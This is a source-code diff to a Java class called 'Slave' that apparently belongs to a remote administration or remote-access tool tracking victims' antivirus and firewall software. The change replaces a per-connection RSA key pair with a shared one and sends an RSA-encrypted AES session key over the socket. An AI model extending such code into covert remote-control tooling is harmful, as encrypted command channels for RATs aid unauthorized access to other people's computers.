@@ -30,9 +30,6 @@ import java.io.InputStream;
 import java.io.OutputStream;
 import java.io.PrintWriter;
 import java.net.Socket;
-import java.security.KeyPair;
-import java.security.KeyPairGenerator;
-import java.security.PrivateKey;
 import java.security.PublicKey;
 import java.util.ArrayList;
 import java.util.Arrays;
@@ -40,6 +37,8 @@ import java.util.List;
 import java.util.Random;
 
 import javax.crypto.BadPaddingException;
+import javax.crypto.KeyGenerator;
+import javax.crypto.SecretKey;
 import javax.swing.ImageIcon;
 
 @SuppressWarnings("unused")
@@ -65,6 +64,7 @@ public class Slave implements Runnable {
 	private Antivirus[] antiviruses;
 	private Firewall[] firewalls;
 	
+	private PublicKey rsaKey;
 	private byte[] key;
 
 	private String computername = "";
@@ -149,15 +149,20 @@ public class Slave implements Runnable {
 
 			this.dis = new DataInputStream(inputStream);
 			this.dos = new DataOutputStream(outputStream);
-						
-			KeyPairGenerator kpg = KeyPairGenerator.getInstance("RSA");
-			kpg.initialize(1028);
-			KeyPair kp = kpg.genKeyPair();
-			PublicKey publicKey = kp.getPublic();
-			PrivateKey privateKey = kp.getPrivate();
 			
-			KeyExchanger exchanger = new KeyExchanger(dis, dos);
-			key = exchanger.getAESKey(privateKey, publicKey);
+			KeyExchanger exchanger = new KeyExchanger(dis, dos, GlobalKeyPair.getKeyPair());
+			exchanger.writePublicKey();
+			exchanger.readRemotePublicKey();
+			rsaKey = exchanger.getRemoteKey();
+			
+            KeyGenerator keyGen = KeyGenerator.getInstance("AES");
+            keyGen.init(128);
+            SecretKey secretKey = keyGen.generateKey();
+
+            key = secretKey.getEncoded();
+            byte[] encryptedKey = Crypto.encrypt(key, rsaKey, "RSA");
+            dos.writeInt(encryptedKey.length);
+            dos.write(encryptedKey);
 			
 			if (Main.debug) {
 				Main.debug("Encryption key: " + Hex.encode(key));
